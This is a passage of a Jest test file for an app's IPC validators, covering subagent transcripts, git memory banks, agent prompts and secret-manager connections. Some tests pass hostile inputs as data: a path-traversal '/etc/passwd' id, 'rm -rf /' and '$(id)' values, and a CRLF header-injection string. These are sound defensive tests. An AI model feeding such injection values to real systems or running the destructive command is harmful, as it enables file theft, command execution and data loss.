    expect(validateTerminalList(undefined)).toEqual({});
  });
});

/**
 * Opening a subagent's transcript.
 *
 * The field that matters here is `agentId`, because the provider turns it into
 * a *filename* — `subagents/agent-<id>.jsonl` — so it is renderer-supplied
 * input that reaches the filesystem. Everything else on this request is the
 * same shape a session read already takes.
 */
describe('validateSessionsSubagentMessages', () => {
  const base = {
    profileId: 'profile-1',
    sessionId: 'sess-1',
    agentId: 'a12e2a10eff61ec31',
    runId: 'agent:a12e2a10eff61ec31',
  };

  it('accepts a task id, which is what an agent id is', () => {
    expect(validateSessionsSubagentMessages({ ...base, cwd: '/repo', offset: 12, limit: 200 })).toEqual({
      ...base,
      cwd: '/repo',
      offset: 12,
      limit: 200,
    });
  });

  it('refuses an agent id that is really a path', () => {
    // The one that matters: a `..` segment would climb out of the session's own
    // directory on its way to becoming a filename.
    expect(() =>
      validateSessionsSubagentMessages({ ...base, agentId: '../../../etc/passwd' }),
    ).toThrow(ValidationError);
    expect(() => validateSessionsSubagentMessages({ ...base, agentId: 'a/b' })).toThrow(
      ValidationError,
    );
    expect(() => validateSessionsSubagentMessages({ ...base, agentId: '' })).toThrow(
      ValidationError,
    );
  });

  it('requires the agent id at all', () => {
    const { agentId: _dropped, ...without } = base;
    expect(() => validateSessionsSubagentMessages(without)).toThrow(ValidationError);
  });

  it('rebuilds the request, so nothing extra reaches the provider', () => {
    expect(
      validateSessionsSubagentMessages({ ...base, sessionStore: { load: 'evil' }, dir: '/etc' }),
    ).toEqual(base);
  });
});

/**
 * The memory-bank switches.
 *
 * The invariant worth a test is that neither direction has a default: a call
 * that omits the field must be refused rather than resolved, because guessing
 * `true` would opt a machine into writing to a repository the team shares, and
 * guessing `false` would silently undo an opt-in the user made.
 */
describe('validateMemoryBankSetEnabled', () => {
  it('takes the state it is given, both ways', () => {
    expect(validateMemoryBankSetEnabled({ slug: 'cerebro', enabled: true })).toEqual({
      slug: 'cerebro',
      enabled: true,
    });
    expect(validateMemoryBankSetEnabled({ slug: 'cerebro', enabled: false })).toEqual({
      slug: 'cerebro',
      enabled: false,
    });
  });

  it('refuses a call that does not say which', () => {
    expect(() => validateMemoryBankSetEnabled({ slug: 'cerebro' })).toThrow(ValidationError);
  });

  it('refuses a truthy stand-in for the boolean', () => {
    // `'true'`, `1` and `'on'` all read as yes to a looser check, and the one
    // that gets through is an opt-in nobody made.
    expect(() => validateMemoryBankSetEnabled({ slug: 'cerebro', enabled: 'true' })).toThrow(ValidationError);
    expect(() => validateMemoryBankSetEnabled({ slug: 'cerebro', enabled: 1 })).toThrow(ValidationError);
  });

  it('refuses a slug outside the banks` own grammar', () => {
    expect(() => validateMemoryBankSetEnabled({ slug: '../etc', enabled: true })).toThrow(ValidationError);
    expect(() => validateMemoryBankSetEnabled({ slug: 'No Caps', enabled: true })).toThrow(ValidationError);
  });

  it('rebuilds the request, so nothing extra reaches main', () => {
    expect(validateMemoryBankSetEnabled({ slug: 'cerebro', enabled: true, root: '/etc' })).toEqual({
      slug: 'cerebro',
      enabled: true,
    });
  });
});

describe('validateMemoryBanksSetMasterEnabled', () => {
  it('takes the state it is given, and refuses silence and stand-ins', () => {
    expect(validateMemoryBanksSetMasterEnabled({ enabled: false })).toEqual({ enabled: false });
    expect(() => validateMemoryBanksSetMasterEnabled({})).toThrow(ValidationError);
    expect(() => validateMemoryBanksSetMasterEnabled({ enabled: 'on' })).toThrow(ValidationError);
  });
});

/**
 * Registration is the one channel that names locations, so its validator is
 * the one worth pinning hardest: modes and roles are closed sets, and the
 * requirements differ per mode — a join without a remote (or an adopt without
 * a path) would otherwise fail deep in the CLI with a worse sentence.
 */
describe('validateMemoryBankAdd', () => {
  it('accepts each mode with its requirements met', () => {
    expect(
      validateMemoryBankAdd({ mode: 'join', slug: 'team', role: 'readwrite', remote: 'https://x/y.git' }),
    ).toEqual({ mode: 'join', slug: 'team', role: 'readwrite', remote: 'https://x/y.git' });
    expect(validateMemoryBankAdd({ mode: 'create', slug: 'notes', role: 'readwrite' })).toEqual({
      mode: 'create',
      slug: 'notes',
      role: 'readwrite',
    });
    expect(
      validateMemoryBankAdd({ mode: 'adopt', slug: 'docs', role: 'readonly', path: '/Users/d/bank' }),
    ).toEqual({ mode: 'adopt', slug: 'docs', role: 'readonly', path: '/Users/d/bank' });
  });

  it('refuses a join without a remote and an adopt without a path', () => {
    expect(() => validateMemoryBankAdd({ mode: 'join', slug: 'team', role: 'readwrite' })).toThrow(
      ValidationError,
    );
    expect(() => validateMemoryBankAdd({ mode: 'adopt', slug: 'docs', role: 'readwrite' })).toThrow(
      ValidationError,
    );
  });

  it('refuses modes and roles outside the closed sets', () => {
    expect(() =>
      validateMemoryBankAdd({ mode: 'clone', slug: 'team', role: 'readwrite', remote: 'x' }),
    ).toThrow(ValidationError);
    expect(() => validateMemoryBankAdd({ mode: 'create', slug: 'team', role: 'admin' })).toThrow(
      ValidationError,
    );
  });
});

/**
 * The add channel now carries a secret, which changes what its validator is
 * for. Two things matter and they pull in opposite directions: the token has
 * to survive intact (trimming a credential is how a value that looks right
 * fails to authenticate), and nothing *around* it may survive at all — this
 * object becomes the environment of a subprocess.
 */
describe('validateMemoryBankAdd with a token', () => {
  it('keeps the token exactly, and defaults the username by omitting it', () => {
    const token = '  forgejo-9f3c1a77b2e04d6a8c5f0e1b7d4a9268  ';
    expect(
      validateMemoryBankAdd({
        mode: 'join',
        slug: 'team',
        role: 'readwrite',
        remote: 'https://git.example.com/team/bank.git',
        auth: { token },
      }),
    ).toEqual({
      mode: 'join',
      slug: 'team',
      role: 'readwrite',
      remote: 'https://git.example.com/team/bank.git',
      // Untrimmed on purpose: whitespace can be part of what the host issued.
      auth: { token },
    });
  });

  it('keeps a username the host requires, trimmed', () => {
    const request = validateMemoryBankAdd({
      mode: 'join',
      slug: 'team',
      role: 'readwrite',
      remote: 'https://gitlab.com/team/bank.git',
      auth: { token: 'glpat-abc', username: '  bank-deploy ' },
    });
    expect(request.auth).toEqual({ token: 'glpat-abc', username: 'bank-deploy' });
  });

  it('drops unknown keys from the credential', () => {
    // This object is about to be turned into a subprocess environment. An
    // unknown key surviving validation is an unknown key reaching a spawn.
    const request = validateMemoryBankAdd({
      mode: 'join',
      slug: 'team',
      role: 'readwrite',
      remote: 'https://git.example.com/team/bank.git',
      auth: { token: 'abc', helper: 'rm -rf /', GIT_CONFIG_COUNT: '9' },
    });
    expect(request.auth).toEqual({ token: 'abc' });
  });

  it('refuses a credential-bearing remote, whether or not a token came with it', () => {
    // The one shape that would write a secret into .git/config on clone.
    expect(() =>
      validateMemoryBankAdd({
        mode: 'join',
        slug: 'team',
        role: 'readwrite',
        remote: 'https://user:glpat-abc@git.example.com/team/bank.git',
      }),
    ).toThrow(ValidationError);
    expect(() =>
      validateMemoryBankAdd({
        mode: 'join',
        slug: 'team',
        role: 'readwrite',
        remote: 'https://glpat-abc@git.example.com/team/bank.git',
        auth: { token: 'abc' },
      }),
    ).toThrow(ValidationError);
  });

  it('refuses a username that could be a token, or that could rewrite a shell body', () => {
    for (const username of ['tok en', 'a;b', '$(id)']) {
      expect(() =>
        validateMemoryBankAdd({
          mode: 'join',
          slug: 'team',
          role: 'readwrite',
          remote: 'https://git.example.com/team/bank.git',
          auth: { token: 'abc', username },
        }),
      ).toThrow(ValidationError);
    }
  });

  it('refuses a token that is missing, empty or absurd', () => {
    const join = (auth: unknown) => ({
      mode: 'join',
      slug: 'team',
      role: 'readwrite',
      remote: 'https://git.example.com/team/bank.git',
      auth,
    });
    expect(() => validateMemoryBankAdd(join({}))).toThrow(ValidationError);
    expect(() => validateMemoryBankAdd(join({ token: '' }))).toThrow(ValidationError);
    expect(() => validateMemoryBankAdd(join({ token: 42 }))).toThrow(ValidationError);
    expect(() => validateMemoryBankAdd(join({ token: 'x'.repeat(4097) }))).toThrow(ValidationError);
    // 4096 is the ceiling, not the wall a normal token hits.
    expect(validateMemoryBankAdd(join({ token: 'x'.repeat(4096) })).auth?.token).toHaveLength(4096);
  });

  it('leaves a join with no token exactly as it was', () => {
    // The path most banks take. No `auth` key at all, rather than an empty one.
    expect(
      validateMemoryBankAdd({
        mode: 'join',
        slug: 'team',
        role: 'readwrite',
        remote: 'git@github.com:Rx-Ventures/cerebro.git',
      }),
    ).toEqual({
      mode: 'join',
      slug: 'team',
      role: 'readwrite',
      remote: 'git@github.com:Rx-Ventures/cerebro.git',
    });
  });
});

/**
 * The verify channel: one remote, one optional credential, and nothing else —
 * it is the only channel that names a remote without joining it, so what it
 * accepts is exactly what `git ls-remote` will be pointed at.
 */
describe('validateMemoryBanksVerifyRemote', () => {
  it('accepts a remote alone, and a remote with a credential', () => {
    expect(validateMemoryBanksVerifyRemote({ remote: 'https://git.example.com/team/bank.git' })).toEqual({
      remote: 'https://git.example.com/team/bank.git',
    });
    expect(
      validateMemoryBanksVerifyRemote({
        remote: 'https://git.example.com/team/bank.git',
        auth: { token: 'abc', username: 'x-access-token' },
      }),
    ).toEqual({
      remote: 'https://git.example.com/team/bank.git',
      auth: { token: 'abc', username: 'x-access-token' },
    });
  });

  it('requires a remote, and refuses one carrying credentials', () => {
    expect(() => validateMemoryBanksVerifyRemote({})).toThrow(ValidationError);
    expect(() => validateMemoryBanksVerifyRemote({ remote: '' })).toThrow(ValidationError);
    expect(() =>
      validateMemoryBanksVerifyRemote({ remote: 'https://u:p@git.example.com/team/bank.git' }),
    ).toThrow(ValidationError);
  });

  it('drops anything else the renderer sent', () => {
    expect(
      validateMemoryBanksVerifyRemote({
        remote: 'https://git.example.com/team/bank.git',
        path: '/etc',
        slug: 'team',
      }),
    ).toEqual({ remote: 'https://git.example.com/team/bank.git' });
  });
});

describe('validateAgentPromptsSave', () => {
  const row = (over: Record<string, unknown>) => ({
    document: {
      prompts: [
        { id: 'builtin:cerebro', name: 'x', builtIn: 'builtin:cerebro', scope: { kind: 'all' }, ...over },
      ],
    },
  });

  it('strips a body sent for a built-in the renderer does not claim was taken over', () => {
    // The edge's half of the rule the protocol's parser also keeps. A body
    // without the flag is text nobody chose, and this channel is the one place
    // a compromised renderer could introduce it.
    const saved = validateAgentPromptsSave(row({ markdown: 'forged' }));
    expect(saved.document.prompts[0]?.markdown).toBe('');
    expect(saved.document.prompts[0]?.overridden).toBeUndefined();
  });

  it('carries a built-in’s body through when the row says the user took it over', () => {
    const saved = validateAgentPromptsSave(row({ overridden: true, markdown: 'Ours.' }));
    expect(saved.document.prompts[0]?.overridden).toBe(true);
    expect(saved.document.prompts[0]?.markdown).toBe('Ours.');
  });

  it('drops the flag from a prompt the user wrote, where it means nothing', () => {
    const saved = validateAgentPromptsSave({
      document: {
        prompts: [{ id: 'p1', name: 'Mine', markdown: 'x', overridden: true, scope: { kind: 'all' } }],
      },
    });
    expect(saved.document.prompts[0]?.overridden).toBeUndefined();
    expect(saved.document.prompts[0]?.markdown).toBe('x');
  });

  it('refuses a flag that is not a boolean rather than coercing it', () => {
    expect(() => validateAgentPromptsSave(row({ overridden: 'true', markdown: 'forged' }))).toThrow(
      ValidationError,
    );
  });
});

/* -------------------------------------------------------------------------- */
/* Key managers                                                               */
/* -------------------------------------------------------------------------- */

/**
 * The reference grammar, at the boundary.
 *
 * Every string in a `SecretRef` is interpolated into a URL path or query on
 * its way to a key manager, so the refusals here are not tidiness — a `..`
 * segment is a request addressed to a different endpoint of the same server,
 * and a control character is a request split in two. The rule itself lives in
 * `protocol/secretRefs.ts` so that the renderer's disabled Test button and
 * this validator cannot drift apart; what these tests pin is that the
 * validator actually *applies* it, and rebuilds rather than passes through.
 */
describe('validateSecretsRefTest', () => {
  const openbao = (over: Record<string, unknown> = {}) => ({
    ref: {
      provider: 'openbao',
      connectionId: 'conn-1',
      mount: 'secret',
      path: 'claude/artemis',
      key: 'git_token',
      ...over,
    },
  });

  it('rebuilds an OpenBao reference field by field, dropping anything else', () => {
    const request = validateSecretsRefTest(openbao({ kvVersion: 'auto', smuggled: 'x' }));
    expect(request.ref).toEqual({
      provider: 'openbao',
      connectionId: 'conn-1',
      mount: 'secret',
      path: 'claude/artemis',
      key: 'git_token',
      kvVersion: 'auto',
    });
    expect(request.ref).not.toHaveProperty('smuggled');
  });

  it('rebuilds a Doppler reference, keeping project and config only when given', () => {
    expect(
      validateSecretsRefTest({
        ref: { provider: 'doppler', connectionId: 'conn-2', name: 'GIT_TOKEN', smuggled: 1 },
      }).ref,
    ).toEqual({ provider: 'doppler', connectionId: 'conn-2', name: 'GIT_TOKEN' });

    expect(
      validateSecretsRefTest({
        ref: {
          provider: 'doppler',
          connectionId: 'conn-2',
          name: 'GIT_TOKEN',
          project: 'app',
          config: 'dev',
        },
      }).ref,
    ).toEqual({
      provider: 'doppler',
      connectionId: 'conn-2',
      name: 'GIT_TOKEN',
      project: 'app',
      config: 'dev',
    });
  });

  it('refuses a ".." segment in a mount or a path', () => {
    // The refusal this grammar exists for: `secret/../sys` addresses a
    // different endpoint of the same server.
    expect(() => validateSecretsRefTest(openbao({ path: '../sys/seal' }))).toThrow(ValidationError);
    expect(() => validateSecretsRefTest(openbao({ mount: 'kv/../secret' }))).toThrow(ValidationError);
    // A segment that merely *contains* dots is a legitimate path.
    expect(validateSecretsRefTest(openbao({ path: 'a..b/c' })).ref).toMatchObject({ path: 'a..b/c' });
  });

  it('refuses an absolute path, a backslash and a control character', () => {
    expect(() => validateSecretsRefTest(openbao({ path: '/claude/artemis' }))).toThrow(ValidationError);
    expect(() => validateSecretsRefTest(openbao({ mount: 'sec\\ret' }))).toThrow(ValidationError);
    expect(() => validateSecretsRefTest(openbao({ path: 'a\r\nHost: evil' }))).toThrow(ValidationError);
    expect(() => validateSecretsRefTest(openbao({ key: 'git\u0007token' }))).toThrow(ValidationError);
  });

  it('refuses an unknown provider and a nonsense kvVersion', () => {
    expect(() => validateSecretsRefTest(openbao({ provider: 'hashicorp' }))).toThrow(ValidationError);
    expect(() => validateSecretsRefTest(openbao({ kvVersion: 3 }))).toThrow(ValidationError);
    expect(() => validateSecretsRefTest(openbao({ kvVersion: '2' }))).toThrow(ValidationError);
  });

  it('requires every field the reference is made of', () => {
    expect(() => validateSecretsRefTest(openbao({ mount: '' }))).toThrow(ValidationError);
    expect(() => validateSecretsRefTest(openbao({ key: undefined }))).toThrow(ValidationError);
    expect(() => validateSecretsRefTest({ ref: { provider: 'doppler', connectionId: 'c' } })).toThrow(
      ValidationError,
    );
  });
});

/**
 * The save channel — the one place on this surface a credential travels, and
 * therefore the one validated hardest.
 */
describe('validateSecretsConnectionSave', () => {
  const base = {
    label: 'Work vault',
    provider: 'openbao',
    address: 'https://vault.example.com:8200',
    authMethod: 'userpass',
    username: 'demo',
  };

  it('rebuilds the connection, dropping fields the contract does not name', () => {
    const saved = validateSecretsConnectionSave({
      ...base,
      credential: { password: 'hunter2-and-then-some' },
      smuggled: 'x',
    });
    expect(saved).toEqual({
      label: 'Work vault',
      provider: 'openbao',
      address: 'https://vault.example.com:8200',
      authMethod: 'userpass',
      username: 'demo',
      credential: { password: 'hunter2-and-then-some' },
    });
  });

  it('refuses a credential that is both a password and a token', () => {
    // Two answers to one question; whichever main preferred would be a silent
    // decision about where the user's secret goes.
    expect(() =>
      validateSecretsConnectionSave({ ...base, credential: { password: 'p', token: 't' } }),
    ).toThrow(ValidationError);
  });

  it('drops an empty credential object rather than storing an empty secret', () => {
    // Absent means "leave the stored one alone"; an empty one would be a
    // credential that authenticates as nobody.
    expect(validateSecretsConnectionSave({ ...base, credential: {} })).not.toHaveProperty('credential');
  });

  it('refuses an address carrying a credential', () => {
    // A manager address spelled `user:pass@host` would put a secret into the
    // plain JSON file this whole feature exists to keep secrets out of.
    expect(() =>
      validateSecretsConnectionSave({ ...base, address: 'https://user:pass@vault.example.com:8200' }),
    ).toThrow(ValidationError);
  });

  it('refuses a wrong scheme, and requires an address for a self-hosted manager', () => {
    expect(() => validateSecretsConnectionSave({ ...base, address: 'ws://vault.example.com' })).toThrow(
      ValidationError,
    );
    expect(() => validateSecretsConnectionSave({ ...base, address: '' })).toThrow(ValidationError);
    // Doppler's address is fixed, so an empty one is allowed and defaulted in
    // main — the form does not ask for it.
    expect(
      validateSecretsConnectionSave({
        label: 'Team Doppler',
        provider: 'doppler',
        address: '',
        authMethod: 'token',
        credential: { token: 'dp.st.dev.xxxxxxxxxxxx' },
      }).address,
    ).toBe('');
  });

  it('requires a username for a username-and-password login', () => {
    expect(() => validateSecretsConnectionSave({ ...base, username: undefined })).toThrow(
      ValidationError,
    );
    expect(() => validateSecretsConnectionSave({ ...base, username: '   ' })).toThrow(ValidationError);
  });

  it('refuses a caPem that is not a certificate', () => {
    expect(() => validateSecretsConnectionSave({ ...base, caPem: 'trust me' })).toThrow(ValidationError);
    expect(
      validateSecretsConnectionSave({
        ...base,
        caPem: '-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n',
      }).caPem,
    ).toContain('BEGIN CERTIFICATE');
  });

  it('refuses an unknown provider or auth method rather than defaulting one', () => {
    expect(() => validateSecretsConnectionSave({ ...base, provider: 'vault' })).toThrow(ValidationError);
    expect(() => validateSecretsConnectionSave({ ...base, authMethod: 'oidc' })).toThrow(ValidationError);
  });

  it('caps the credential without trimming it', () => {
    // A token is whatever the manager issued: quietly removing whitespace from
    // a secret is how a value that looks right fails to authenticate.
    const padded = '  dp.st.dev.xxxxxxxxxxxx  ';
    expect(
      validateSecretsConnectionSave({
        ...base,
        authMethod: 'token',
        credential: { token: padded },
      }).credential?.token,
    ).toBe(padded);
    expect(() =>
      validateSecretsConnectionSave({ ...base, credential: { password: 'x'.repeat(8193) } }),
    ).toThrow(ValidationError);
  });
});

describe('the remaining key-manager channels', () => {
  it('accepts an empty listing request, because main owns the registry', () => {
    expect(validateSecretsConnectionsList(undefined)).toEqual({});
    expect(validateSecretsConnectionsList({ sneak: 1 })).toEqual({});
  });

  it('takes an id and nothing else for delete and verify', () => {
    expect(validateSecretsConnectionDelete({ id: 'conn-1', extra: 2 })).toEqual({ id: 'conn-1' });
    expect(validateSecretsConnectionVerify({ id: 'conn-1', extra: 2 })).toEqual({ id: 'conn-1' });
    expect(() => validateSecretsConnectionDelete({})).toThrow(ValidationError);
  });

  it('holds the certificate fetch to the same URL rules as an address', () => {
    // A renderer must not be able to open a socket to an address the address
    // validator would refuse.
    expect(validateSecretsFetchServerCert({ address: '  https://vault.example.com:8200 ' })).toEqual({
      address: 'https://vault.example.com:8200',
    });
    expect(() => validateSecretsFetchServerCert({ address: 'ftp://vault.example.com' })).toThrow(
      ValidationError,
    );
    expect(() =>
      validateSecretsFetchServerCert({ address: 'https://user:pass@vault.example.com' }),
    ).toThrow(ValidationError);
  });
});

/**
 * The join channel's new alternative: an address instead of a secret.
 *
 * The rule under test is `oneof` — a request carrying both a token and a
 * reference is two answers to one question, and one carrying neither is an
 * `auth` that authenticates as nobody.
 */
describe('validateMemoryBankAdd with a secret reference', () => {
  const join = (auth: unknown) => ({
    mode: 'join',
    slug: 'team',
    role: 'readwrite',
    remote: 'https://git.example.com/team/bank.git',
    auth,
  });

  const ref = {
    provider: 'openbao',
    connectionId: 'conn-1',
    mount: 'secret',
    path: 'claude/artemis',
    key: 'git_token',
  };

  it('carries a reference through, rebuilt', () => {
    const request = validateMemoryBankAdd(join({ ref: { ...ref, smuggled: 'x' } }));
    expect(request.auth).toEqual({ ref });
    expect(request.auth?.token).toBeUndefined();
  });

  it('keeps the username beside a reference, because git still echoes it', () => {
    expect(validateMemoryBankAdd(join({ ref, username: '  bank-deploy  ' })).auth).toEqual({
      ref,
      username: 'bank-deploy',
    });
  });

  it('refuses a token and a reference together', () => {
    expect(() => validateMemoryBankAdd(join({ token: 'abc', ref }))).toThrow(ValidationError);
  });

  it('refuses an auth that carries neither', () => {
    expect(() => validateMemoryBankAdd(join({ username: 'x-access-token' }))).toThrow(ValidationError);
  });

  it('applies the reference grammar here too, not only on the test channel', () => {
    expect(() => validateMemoryBankAdd(join({ ref: { ...ref, path: '../sys/seal' } }))).toThrow(
      ValidationError,
    );
  });

  it('accepts a reference on the verify channel, which never stores one', () => {
    expect(
      validateMemoryBanksVerifyRemote({
        remote: 'https://git.example.com/team/bank.git',
        auth: { ref },
      }).auth,
    ).toEqual({ ref });
  });
});

describe('validateAgentPromptsSave: built-ins the user removed', () => {
  const row = { id: 'p1', name: 'House style', markdown: 'x', enabled: true, scope: { kind: 'all' } };

  it('carries a dismissal that names a prompt this build ships', () => {
    const { document } = validateAgentPromptsSave({
      document: { version: 1, prompts: [row], dismissedBuiltIns: ['builtin:cerebro'] },
    });
    expect(document.dismissedBuiltIns).toEqual(['builtin:cerebro']);
  });

  it('writes no field when there is nothing to say', () => {
    for (const dismissed of [undefined, null, []]) {
      const { document } = validateAgentPromptsSave({
        document: { version: 1, prompts: [row], dismissedBuiltIns: dismissed },
      });
      expect(document).not.toHaveProperty('dismissedBuiltIns');
    }
  });

  it('refuses a dismissal that names nothing this build ships, and a non-array', () => {
    expect(() =>
      validateAgentPromptsSave({
        document: { version: 1, prompts: [row], dismissedBuiltIns: ['builtin:nope'] },
      }),
    ).toThrow(ValidationError);
    expect(() =>
      validateAgentPromptsSave({
        document: { version: 1, prompts: [row], dismissedBuiltIns: 'builtin:cerebro' },
      }),
    ).toThrow(ValidationError);
  });
});

